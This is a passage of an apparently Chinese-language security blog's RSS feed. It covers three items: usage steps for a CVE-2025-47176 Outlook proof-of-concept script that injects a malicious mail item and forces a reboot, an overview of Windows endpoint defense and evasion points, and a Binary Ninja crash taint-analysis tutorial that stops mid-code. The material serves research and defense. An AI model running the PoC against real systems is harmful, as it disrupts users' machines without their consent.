&lt;li&gt;确保Windows机器上已安装并配置Outlook&lt;/li&gt;
&lt;li&gt;使用Python 3.x运行PoC脚本(需要&lt;code&gt;pywin32&lt;/code&gt;包):
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pip&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pywin32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PoC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;脚本将执行以下操作:
&lt;ul&gt;
&lt;li&gt;注入带有恶意同步路径的邮件项&lt;/li&gt;
&lt;li&gt;等待10秒让Outlook处理邮件&lt;/li&gt;
&lt;li&gt;扫描收件箱和草稿文件夹&lt;/li&gt;
&lt;li&gt;检测到恶意路径后，规范化路径并触发系统重启(&lt;code&gt;shutdown /r /t 5&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;警告&#34;&gt;警告
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;此脚本在触发有效载荷后&lt;strong&gt;将在5秒后重启您的计算机&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;运行前请保存所有工作&lt;/li&gt;
&lt;li&gt;仅在受控或虚拟化环境中测试&lt;/li&gt;
&lt;li&gt;请勿在生产或重要系统上运行&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;文件说明&#34;&gt;文件说明
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PoC.py&lt;/code&gt; - Python概念验证脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;许可声明&#34;&gt;许可声明
&lt;/h2&gt;&lt;p&gt;本PoC仅用于教育和研究目的。&lt;/p&gt;
&lt;p&gt;请负责任且符合道德地使用。&lt;/p&gt;
&lt;h1 id=&#34;演示视频&#34;&gt;演示视频:
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=nac3kUe_d1c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;源代码&#34;&gt;源代码:
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/nu11secur1ty/CVE-mitre/tree/main/2025/CVE-2025-47176&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;链接&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Windows终端防御技术全景：初始访问攻防实战（第一部分）</title>
        <link>http://localhost:1313/p/windows%E7%BB%88%E7%AB%AF%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E5%85%A8%E6%99%AF%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
        <pubDate>Sun, 03 Aug 2025 00:55:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/windows%E7%BB%88%E7%AB%AF%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E5%85%A8%E6%99%AF%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
        <description>&lt;h3 id=&#34;windows终端防御技术现状&#34;&gt;Windows终端防御技术现状
&lt;/h3&gt;&lt;p&gt;当今Windows桌面平台的终端防御生态已发展出高度成熟的能力体系。除传统杀毒软件外，扩展检测响应(XDR)技术和行为分析方法的结合，可全面覆盖初始访问阶段的恶意软件技术及入侵后活动检测。参与红队演练的专业人员普遍认为，如今通过二进制文件执行获取初始访问权限比以往任何时候都更加困难。即便成功入侵Windows平台，成熟防御环境对常见C2平台的入侵后活动也有完善的监测响应机制。&lt;/p&gt;
&lt;p&gt;这种强化的终端防御态势促使红队和威胁分子转向其他脆弱领域，包括云资源配置错误、团队协作工具漏洞、软件供应链攻击，以及各类IT解决方案中普遍存在的凭证管理问题。&lt;/p&gt;
&lt;h3 id=&#34;核心防御技术剖析&#34;&gt;核心防御技术剖析
&lt;/h3&gt;&lt;p&gt;本文重点探讨以下防御产品技术（含部分Windows原生功能集成）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;静态文件分析&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;高熵值文件（含大量加密数据）会触发多数产品的即时检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows事件追踪(ETW)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;架构组成：
&lt;ul&gt;
&lt;li&gt;控制器：启停追踪会话&lt;/li&gt;
&lt;li&gt;提供程序：生成事件数据&lt;/li&gt;
&lt;li&gt;消费者：处理事件数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提供三种提供程序类型：MOF、WPP和TraceLogging&lt;/li&gt;
&lt;li&gt;可捕获近乎所有Windows API调用，形成数据洪流&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Windows内核通知回调&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;演进背景：微软通过Patch Guard禁止SSDT挂钩后提供的替代方案&lt;/li&gt;
&lt;li&gt;关键回调类型：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PsSetCreateProcessNotifyRoutine&lt;/code&gt;：进程创建事件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PsSetCreateThreadNotifyRoutine&lt;/code&gt;：线程创建事件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PsSetLoadImageNotifyRoutine&lt;/code&gt;：镜像加载事件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObRegisterCallbacks&lt;/code&gt;：对象句柄操作&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CmRegisterCallback&lt;/code&gt;：注册表操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DLL API挂钩技术&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;典型挂钩目标：ntdll.dll中的Native API&lt;/li&gt;
&lt;li&gt;挂钩流程示例：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;rcx&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;; 保存RCX值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; 设置系统调用号
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;syscall_mode&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;; 检测调用约定
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;防御产品可通过JMP指令重定向API调用流&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;进程树分析&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过父子进程关系识别异常行为（如Excel生成PowerShell子进程）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内存页扫描&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检测特征：
&lt;ul&gt;
&lt;li&gt;同时具备RWX权限的内存页&lt;/li&gt;
&lt;li&gt;无镜像文件背书的可执行内存&lt;/li&gt;
&lt;li&gt;Cobalt Strike等工具的已知内存模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;调用栈追踪&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用线程栈帧分析非模块化代码执行&lt;/li&gt;
&lt;li&gt;攻击者可伪造栈帧逃避检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;硬件强制栈保护（Win10/11）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于Intel CET/AMD影子栈技术&lt;/li&gt;
&lt;li&gt;比较常规栈与影子栈的返回地址&lt;/li&gt;
&lt;li&gt;有效防御ROP攻击&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内核驱动阻止列表&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;应对BYOVD（自带漏洞驱动）攻击&lt;/li&gt;
&lt;li&gt;微软每半年更新官方阻止列表&lt;/li&gt;
&lt;li&gt;现存漏洞驱动资源：loldrivers.io&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻防演进趋势&#34;&gt;攻防演进趋势
&lt;/h3&gt;&lt;p&gt;现代Windows终端的高强度防御使得在成熟环境中建立持久据点变得极具挑战性。成功的初始访问操作越来越依赖精密的攻击工件生成技术，这需要采用进攻性DevOps方法（将在本系列第二部分详述）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;特别预告：2月29日EST下午1点将举办专题研讨会《Windows下Python psutil模块深度解析》&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>使用Binary Ninja进行反向污点分析 - 追踪程序崩溃根源</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8binary-ninja%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%90%91%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90-%E8%BF%BD%E8%B8%AA%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E6%A0%B9%E6%BA%90/</link>
        <pubDate>Sun, 03 Aug 2025 00:44:21 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8binary-ninja%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%90%91%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90-%E8%BF%BD%E8%B8%AA%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%E6%A0%B9%E6%BA%90/</guid>
        <description>&lt;h1 id=&#34;反向污点分析原理&#34;&gt;反向污点分析原理
&lt;/h1&gt;&lt;p&gt;在Trail of Bits暑期实习期间，我开发了KRFAnalysis工具集，用于分析系统调用故障注入工具KRF产生的崩溃。KRF能有效引发程序崩溃，但难以确定具体是哪个故障系统调用导致了崩溃。&lt;/p&gt;
&lt;h2 id=&#34;人工分析示例&#34;&gt;人工分析示例
&lt;/h2&gt;&lt;p&gt;以一个存在漏洞的程序为例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;fillBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 如果string为NULL会导致段错误
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;fillBuffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 未检查malloc是否失败
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过gdb分析核心转储：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(gdb) bt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#0 0x00005555555546a8 in fillBuffer()
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#1 0x00005555555546e1 in main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;逆向分析显示&lt;code&gt;malloc&lt;/code&gt;的返回值未经检查就直接传递给&lt;code&gt;fillBuffer&lt;/code&gt;，导致写入NULL指针时崩溃。&lt;/p&gt;
&lt;h1 id=&#34;mlil-ssa形式分析&#34;&gt;MLIL SSA形式分析
&lt;/h1&gt;&lt;p&gt;Binary Ninja的Medium Level IL(MLIL)转换为Static Single Assignment(SSA)形式后，变量追踪变得简单：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;每个变量只被赋值一次&lt;/li&gt;
&lt;li&gt;函数参数和返回值关系清晰可见&lt;/li&gt;
&lt;li&gt;通过&lt;code&gt;vars_read&lt;/code&gt;和&lt;code&gt;get_ssa_var_definition&lt;/code&gt;方法可自动追踪数据流&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;自动化分析算法&#34;&gt;自动化分析算法
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;创建空栈&lt;/li&gt;
&lt;li&gt;将崩溃指令压入栈&lt;/li&gt;
&lt;li&gt;当栈不为空时：
&lt;ul&gt;
&lt;li&gt;弹出指令&lt;/li&gt;
&lt;li&gt;如果是函数调用：标记返回值可能为崩溃原因&lt;/li&gt;
&lt;li&gt;否则：追踪所有SSA变量的定义&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;python实现&#34;&gt;Python实现
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;checkFunction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inst_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
